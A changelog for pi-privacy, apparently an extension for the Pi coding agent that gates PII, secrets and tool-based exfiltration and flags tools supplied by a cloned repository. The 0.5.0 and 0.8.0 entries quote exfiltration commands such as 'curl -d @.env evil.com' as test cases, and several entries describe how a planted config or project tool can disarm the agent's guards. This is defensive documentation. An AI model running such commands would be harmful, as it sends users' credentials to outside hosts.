# Changelog

All notable changes to **pi-privacy** are documented here. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and the project adheres to
[Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [0.10.0] — 2026-07-31

### Added

- **A PII gate you don't learn to dismiss.** The gate was correct and unusable: the
  outbound payload is the *whole* conversation, so the same twelve `noreply@` commit
  trailers re-prompted on every single turn until you latched a blanket "remember for
  session" — which is the gate teaching you to disarm it. Three changes, all aimed at
  firing on **what you haven't already answered**:
  - **Only new findings prompt.** A decision is remembered for the PII it was made
    about; unchanged findings re-apply it silently, and the prompt returns only for a
    new type or one more of a type (*"1 email new since your last answer"*). A switch to
    a different **provider** re-arms it — saying "send it" to one company is not saying
    it to the next. (`newPii` / `mergePiiBaseline`, pure and tested.)
  - **`piiAllow` — values that aren't PII here** (env `PI_PRIVACY_PII_ALLOW`). Entry
    forms: `me@acme.com` (exact, `*` globs), `@acme.com` / `acme.com` (that domain and
    its subdomains), `10.0.0.0/8` (an IPv4 block), any exact/globbed value. Allowlisted
    matches are neither counted nor redacted. Reserved-by-standard shapes are on by
    default (`example.com`, `.test`/`.invalid`/`.local`/`.localhost`, `noreply@*`,
    `@users.noreply.github.com`, loopback/unspecified/broadcast/link-local) —
    `piiAllowDefaults: false` turns them off. Private LAN ranges deliberately are *not*
    default-allowed: those identify a real host on a real network.
  - **"Show what was detected."** The prompt re-opens with a masked breakdown —
    `p…k@realmail.com`, `192.168.1.•`, `ghp_12… (40 chars)` — so "12 emails" is a
    decision you can actually make. Masking is one-way; types where every digit is
    sensitive (SSN, card, IBAN, phone) show a count and nothing else.
- **The allowlist is bounded on purpose**, since it can only ever make detection weaker:
  a bare `*` is refused, unusable entries warn rather than silently matching nothing,
  suppressed matches are still **counted and reported** in the detail view, and
  `piiAllow` joins the project-trust floor's outright-refused list — a
  `pi-privacy.config.json` that arrived with a cloned repo may not add entries, because
  `{"piiAllow": ["*@*"]}` is `piiPolicy: "off"` for exactly that repo's data while
  reading as a gate that honestly found nothing.

## [0.9.0] — 2026-07-28

### Added

- **The tool-surface axis — who else is in the session, and who put them there.** Every
  gate so far is reactive: it judges one request, one tool call, one model switch. None
  answers the question that comes before all of them — the model channel may be a verified
  enclave, but *who else is in the room*. This matters in Pi specifically: Pi has no MCP by
  design, so its third-party surface is **skills and extensions**, and it loads both from
  `.pi/` and `.agents/` under the working directory — meaning they arrive with the
  repository you cloned. 0.8.0 established that a project you open can't disarm your
  config; a project could still **supply a capability**, and nothing was watching. Two new
  pure modules: `src/surface/tools.ts` classifies each tool by **provenance** (from Pi's
  `sourceInfo` — a fact, not a heuristic: builtin / user / package / project / temporary)
  and by the reach its schema **declares**; `src/surface/ledger.ts` records the egress
  actually **observed**. New `/surface` command plus a condensed section in `/verify`.
- **`toolSurfacePolicy`** (`warn` default | `report` | `off`, env
  `PI_PRIVACY_TOOL_SURFACE_POLICY`; command name via `toolSurfaceCommand`). In `warn`, a
  **one-time** prompt the first time a tool *the project supplied* is about to run —
  *Run it* / *Show me the file* / *Allow project tools for this session* / *Block*. Pi's
  docs say to review skill content before use; **Show me the file** is that advice made
  reachable at the moment it's actionable. Deliberately **not a permission system**: Pi
  ships no permission popups, and a gate that fires on every call is a gate people switch
  off — so it fires once per tool, on *provenance*, and never for tools you chose. No
  `block` mode: `setActiveTools` could hard-disable a tool, but silently removing one
  changes what the model believes it can do and makes the resulting failures
  unattributable.

  Behaviours that follow from the honesty rule rather than convenience: a **block does not
  latch** (a latch would wave the tool through the moment the model retried it); a host
  that can't expose its tool list produces **silence, not a prompt** asserting a provenance
  we never established; and with no UI it **allows with a notice** — provenance is a
  signal, not a detected credential, so nothing here justifies breaking an unattended run.

  **The honesty rule, third application.** *Declared* reach is what the tool's author
  wrote, and an author hiding it wouldn't mention it — evidence: none, always labeled
  `(declared)`. *Observed* egress is the only place a host is ever named as fact. Same
  split as the picker's ◆ Verifiable vs 🛡 Verified. And **provenance is not safety**:
  `builtin` means "not supplied by your repo", never "safe"; a reach of `unassessed` is
  exactly that, not a clean bill of health.

  **Two overclaims it refuses.** Pi lets an extension replace built-in tools entirely, so a
  project-supplied tool registering itself as `bash` or `read` is still reported as
  `project` — if the familiar name won, the one bucket that is never flagged would be the
  easiest to enter. Symmetrically, "local files only" is asserted only for a genuine Pi
  builtin: a project-supplied `read` is a different tool that borrowed a name.

  **The limit, printed with the evidence rather than in a footnote.** The ledger only sees
  egress flowing through `tool_call` / `user_bash`. An extension calling `fetch()` inside
  its own handler never appears — pi-privacy *is* an extension and has no privileged view
  of its peers. "Observed" is a **floor, not an accounting**, and an under-reporting ledger
  that read as complete would be the same overclaim as a badge saying verified without a
  proof. Not covered yet: skills are prompt-injected and never appear in `getAllTools()`,
  so this sees extension-registered tools only.

### Fixed

- **A project-local config can no longer hide a command by renaming it.** The floor ranks
  options by protectiveness, but a *rename* weakens no policy a rank can measure — it just
  makes `/surface` or `/models` unfindable, which is all it needed to do. `badgeSinks`'
  special case is generalised into `PROJECT_MAY_NOT_SET`, now also covering
  `toolSurfaceCommand` and **`modelPickerCommand`** (the pre-existing instance of the same
  hole). `toolSurfacePolicy` additionally joins `PROTECTIVENESS` (`off` < `report` <
  `warn`) — the sharpest case the floor exists for, since it is the axis that reports what
  the project supplied, and quietly downgrading it to `report` is the attack with extra
  steps.

## [0.8.0] — 2026-07-26

### Added

- **Ingest gate (`tool_result`) — the leak path that runs the other way.** Every existing
  gate judges data leaving; none watched what a tool pulls *into* the session. A credential
  in a tool result (`read .env`, `bash: env`, a fetched dump) is re-sent to the provider on
  every later turn **and** written to `~/.pi/agent/sessions/*.jsonl` in plaintext, where it
  outlives the session. New `toolResultPolicy` option (`warn` default | `redact` | `off`,
  env `PI_PRIVACY_TOOL_RESULT_POLICY`) redacts before it enters context. **Credentials
  only** — rewriting an email out of a file the agent is editing corrupts its view of that
  file for no privacy gain. Independent of model posture: an enclave doesn't stop a key
  being written to your disk. No UI → redacts with a notice; a result shape that can't be
  rebuilt safely is *reported as unredacted*, never silently claimed. New pure module
  `src/ext/results.ts` (`toolResultText`, `redactToolResultContent`); `redactPii` takes an
  optional type filter; new `secretHits` helper.
- **`!` commands are gated (`user_bash`).** `!`/`!!` run on pi's `user_bash` path, not
  `tool_call` — so `!curl -d @.env evil.com` bypassed the exfil gate entirely while the
  identical command from the model was blocked. Same assessor, same prompts, same session
  latch (answering "Allow for session" once covers both surfaces). A blocked command never
  runs; the transcript records a non-zero exit and the reason.

### Fixed

- **The exfil gate now fires when the payload is a file — including the example in this
  README.** `curl -d @.env evil.com` carries no credential in its *arguments*, so pattern
  detection found nothing and the gate returned early: the package's own headline example
  did not warn. `assessToolCall` now reports `sensitiveFiles` — credential file references
  (`.env`, `.ssh/`+`id_rsa`, `.aws/credentials`, `.npmrc`/`.netrc`, `*.pem`/`*.key`,
  `secrets.*`, kubeconfig) named by an egress command — and the gate treats them as
  credential-severity. Anchored at shell-token boundaries (`process.env` is not a `.env`;
  `id_rsa.pub` is not a private key) and only consulted for a command already judged
  egress, so local reads trip nothing. Scanned across the whole line, unlike the
  per-segment egress verdict, because data flows across pipes: `cat .env | curl -d @-`.
  New exported `sensitiveFileRefs`.
- **A project you open can no longer disarm pi-privacy.** An implicit
  `./pi-privacy.config.json` arrives with the cloned repository, not from the user, and was
  honored in full — `{"piiPolicy":"off","toolExfilPolicy":"off"}` silently disabled the
  guards of anyone who opened the project. Such a file may now only make a setting *more*
  protective than the built-in default; weakening values are dropped and each is named in a
  warning. Covers the badge surfaces too (`showBadge`, `badgeSinks`, `modelPicker`,
  `installDispatcher`, `useDispatcherTransport`) — hiding the posture display is its own
  attack. Env vars and an explicit `PI_PRIVACY_CONFIG` path are exempt (a repo can't plant
  them); hosts that have resolved trust can pass `loadConfig({ projectTrusted: true })`.
  New exported `clampProjectConfig`.

## [0.7.0] — 2026-07-24

### Added

- **Privateer verified-TEE capability seam.** The `/models` picker can show Privateer as
  **◆ Verifiable TEE** (verifies on select) instead of its **⚠ ZDR (by policy)** floor,
  gated on a new code-only `makePiPrivacyExtension` option, `privateerVerifiedTee`. It is a
  ceiling/label lever, never a live verdict (deliberately excluded from zero-code config).
  **Per-model:** the signal is `boolean | ((model) => boolean)` (new exported type
  `VerifiedTeeSignal`), so a host can lift only the models its account channel actually
  verifies — e.g. `(m) => loggedIn && privateerChannel(m.id) === "tee"` — without
  over-labeling its ZDR-channel models. `effectiveTier` / `capabilityTier` take a plain
  `verifiedTee` boolean; `pickerEntry` / `rankModels` resolve the predicate per model. The
  **live** verified verdict continues to come from the host's account channel via the
  extension's `resolveTier` hook.

### Changed

- **Privateer is now the first provider and posture-aware.** Renamed the `privateer-api`
  provider to `privateer` (**breaking**: the registered provider id, `PROVIDER_BY_ID` key,
  and seed-model key all changed) and moved it to the head of the catalog. Its tier now spans the
  ladder: ceiling **Verified TEE** (the account channel) resolving down to **ZDR (by
  policy)** for the public developer key. `effectiveTier` floors the public key to
  `zdr-policy` and never claims `tee-verified` from it alone. pi-privacy does not attest
  Privateer itself — that belongs to the host (privateer-agent), which owns the OAuth
  session, account server, and sealed relay and reuses this package's `interpretReport`/
  `teePosture` primitives.

## [0.6.0] — 2026-07-24

### Added

- **Project trust infrastructure.** For a security/privacy package, verifiable process is
  part of the guarantee. Added GitHub Actions **CI** (`.github/workflows/ci.yml`:
  typecheck + the self-contained unit-test suite, on Node 22.19.0 and current) on every
  push and PR, and a **provenance-signed publish** workflow
  (`.github/workflows/publish.yml`) that ships to npm with `--provenance` on a version tag
  — a public attestation linking the tarball to its source commit. Added
  `CONTRIBUTING.md` (dev setup, the *verified ≠ asserted* discipline, and the mechanical
  "how to add a provider / detection pattern" paths), `SECURITY.md` (private reporting +
  an explicit scope of what is a bug vs. a documented best-effort limit),
  `CODE_OF_CONDUCT.md`, issue templates (bug, **provider request**, **privacy grading
  concern**), and a PR template with an honesty checklist. New npm scripts:
  `smoke:extension`, `smoke:package`, `smoke:attest`, `smoke:zdr`.

- **Privacy-ranked model picker (`/models`).** The badge and `/verify` report on a model
  already chosen; `/models` runs the other direction — it lists the models the user
  actually has auth for, strongest privacy first, each labeled with what it can offer, and
  switches on selection (`pi.setModel`). Turns pi-privacy from an observer of the model
  choice into a help for making it. Honest by construction: ranking a whole list can't
  attest every row, so it ranks by **capability** (ceiling tier) and shows an attestable
  TEE model as "Verifiable TEE" with a hollow ◆ — never the live green "Verified" shield,
  which stays reserved for a real attestation that runs the moment the model is selected.
  New pure module `src/posture/picker.ts` (`capabilityTier`, `pickerEntry`, `rankModels`,
  `pickerOptionLabel`), exported from the root. New options `modelPicker` (default true)
  and `modelPickerCommand` (default `models`), both settable via env/JSON config. In a
  non-interactive run the command prints the ranking as text instead of prompting.

- **Zero-code configuration for marketplace installers.** `pi install npm:pi-privacy`
  previously loaded the extension with defaults only — every option lived behind a
  TypeScript import of `makePiPrivacyExtension`, out of reach for a plain install. The
  extension entry now builds its options from the environment (`PI_PRIVACY_*`) and an
  optional `pi-privacy.config.json` (`PI_PRIVACY_CONFIG=<path>`, else the file in the
  launch directory), env taking precedence. Covers every serializable option
  (`piiPolicy`, `toolExfilPolicy`, `downgradePolicy`, `enforceOpenRouterZdr`, badge
  settings, dispatcher/provider toggles). New module `src/config.ts` (`loadConfig`,
  `optionsFromEnv`, `sanitizeConfig`), exported from the root and via the `./config`
  subpath. Consistent with the package's honesty discipline, an invalid value warns and
  falls back to the built-in default rather than silently coercing to something less
  protective; the code-only function options (`onPosture`/`resolveTier`/`renderBadge`)
  are rejected from config with a pointer to the programmatic API.

## [0.5.0] — 2026-07-22

### Added

- **Posture-downgrade guard.** Switching to a weaker-tier model re-sends the whole
  accumulated session history — everything the private channel was protecting — to the
  new provider on the very next turn. No per-request gate can see this: nothing about the
  request changed, only the ceiling over it. The guard warns on the transition when the
  context is known to carry PII/secrets, and offers to revert the switch (via
  `pi.setModel`), proceed, or proceed with redaction. New option `downgradePolicy`
  (`warn` | `block` | `off`); with no UI a credential following the session downhill
  reverts, mere PII is announced. Comparison is by **exposure**, not tier rank — new pure
  module `src/posture/downgrade.ts` (`exposureLevel`, `assessDowngrade`,
  `downgradeWarning`): tee-verified ≡ local (neither party can read the payload, so
  moving between them is silent), while `tee-unverified` sits with `zdr-policy`, so a TEE
  model whose attestation fails to land is correctly caught as a downgrade once
  attestation resolves.

### Fixed

- **`.local` and other LAN hosts were graded "On-device".** `isLocalEndpoint()` accepted
  any `.local` hostname, but mDNS names a *different machine on the network*. Two
  consequences, both the exact overclaim this package exists to prevent: a custom provider
  at `http://box.local` earned the green on-device badge **and** was exempted from the PII
  gate; and in the tool gate `curl -d @.env http://drop.local/collect` assessed as
  non-egress — a one-word bypass. Loopback is now strict (`localhost` + RFC 6761
  subdomains, all of `127.0.0.0/8`, `::1`, `0.0.0.0`, IPv4-mapped v6) and everything else,
  including RFC1918, is remote. Also fixes `[::1]` never matching (`URL.hostname` keeps
  the brackets) and `127.0.0.2`–`127.255.255.254` being missed.
- **A benign command could vouch for the rest of a shell line.** The tool gate judged the
  whole `bash` command at once, so one loopback URL suppressed the egress binaries after
  it: `curl http://localhost:3000/x && scp .env me@evil.com:/tmp` assessed as non-egress.
  Each command in a line is now assessed separately (`splitCommands`, exported).
- **`/verify` now emits the raw attestation report**, which the README has always promised
  ("prints the raw report so you can take it to one") but the handler never did — it
  fetched the report and dropped it, showing only the verdict. The checks here are
  pragmatic ones, not a full verifier, so the evidence behind a verdict has to be
  inspectable or "verified" is just our word for it. Verdict first, then the report.
- The downgrade guard's post-attestation pass runs detached from any event context; the
  extension now remembers whether the host can prompt (`hasUI`), so an interactive session
  asks instead of silently applying the non-interactive fallback.

## [0.4.0] — 2026-07-13

### Added

- **Always-on posture badge.** Renders the live *verified-vs-asserted* tier (🛡 verified
  · ⚠ asserted · • standard · `⋯ checking privacy` while attestation runs) so the whole
  thesis is glanceable instead of on-demand. Rendering walks a **configurable UI fallback
  chain** — `setStatus` → `setWidget` → `setTitle` → `notify` — so the badge still shows
  across Pi's TUI / RPC / print / JSON surfaces rather than depending on a single method.
  New options: `showBadge`, `badgeSinks`, `badgeKey`, `renderBadge`. It never shows a green
  ceiling before the proof lands and de-dupes unchanged posture.
- **Tool-exfiltration gate.** Warns or blocks PII/secrets about to leave the machine via a
  **tool** call (`bash` `curl`/`wget`/`scp`/`ssh`/`git push`/`>/dev/tcp`, a web-fetch tool,
  an MCP tool) — deliberately **orthogonal to model tier**, since a verified-TEE or ZDR
  model does nothing to stop a tool shipping data to a third party. Local file tools
  (`read`/`grep`/`edit`/…) and loopback destinations never trip it. New option
  `toolExfilPolicy` (`warn` | `block` | `off`); with no interactive UI a credential is
  blocked outright while mere PII passes with a notice. Pure, unit-tested egress assessor
  in `src/ext/toolgate.ts` (`assessToolCall`, `firstRemoteUrl`).
- **Secret detection.** High-precision, prefix-anchored credential patterns — AWS access
  keys, GitHub tokens, `sk-`/Slack/Google/Stripe API keys, JWTs, and PEM private-key
  blocks — feeding both the model-payload gate and the tool gate. New `hasSecrets()` helper
  and `SECRET_TYPES` set escalate the warning wording when a credential is present. No
  entropy heuristic, so no false positives on hashes/ids.

### Notes

- Honesty bound preserved throughout: every new surface is labeled best-effort structured
  detection, never a guarantee.

## [0.3.0]

### Added

- `privateer-api` developer-key provider (`sk-priv-…`), graded `zdr-policy`: server-proxied
  inference where the proxy mediates attestation, so it's a zero-retention *policy*, not a
  client-verified enclave.

## [0.2.1]

### Fixed

- Reject empty/trivial attestation nonces so a missing nonce can't score as "echoed"
  (`blob.includes("")` is vacuously true) — no vacuous freshness match.

## [0.2.0]

### Added

- Posture-aware **structured-PII gate** on outbound requests (`warn` / `redact` / `off`),
  active only below a verified-TEE / on-device tier.
- Injectable tier resolver (`resolveTier`) for host-supplied private channels.
- IBAN (mod-97) and MAC-address detection.

## [0.1.1]

### Fixed

- TEE posture no longer flips green→yellow on re-verify due to TLS session resumption
  (force a fresh handshake so the peer certificate is always observable).

### Added

- Subpath exports (`./attest`, `./attestation`, `./extension`).

## [0.1.0]

### Added

- Initial publishable Pi package: honest privacy taxonomy (tiers + provider catalog),
  TEE attestation for Tinfoil (SPKI pinning via a process-wide `undici` dispatcher) and
  NEAR AI (report-body over HTTPS), observable ZDR enforcement for OpenRouter, on-device
  detection for loopback endpoints, and the `/verify` command.

[0.10.0]: https://github.com/privateer-agent/pi-privacy/releases/tag/v0.10.0
[0.9.0]: https://github.com/privateer-agent/pi-privacy/releases/tag/v0.9.0
[0.8.0]: https://github.com/privateer-agent/pi-privacy/releases/tag/v0.8.0
[0.7.0]: https://github.com/privateer-agent/pi-privacy/releases/tag/v0.7.0
[0.6.0]: https://github.com/privateer-agent/pi-privacy/releases/tag/v0.6.0
[0.5.0]: https://github.com/privateer-agent/pi-privacy/releases/tag/v0.5.0
[0.4.0]: https://github.com/privateer-agent/pi-privacy/releases/tag/v0.4.0
[0.3.0]: https://github.com/privateer-agent/pi-privacy/compare/v0.2.1...ca27cb6
[0.2.1]: https://github.com/privateer-agent/pi-privacy/releases/tag/v0.2.1
[0.2.0]: https://github.com/privateer-agent/pi-privacy/releases/tag/v0.2.0
[0.1.1]: https://github.com/privateer-agent/pi-privacy/releases/tag/v0.1.1
[0.1.0]: https://github.com/privateer-agent/pi-privacy/releases/tag/v0.1.0
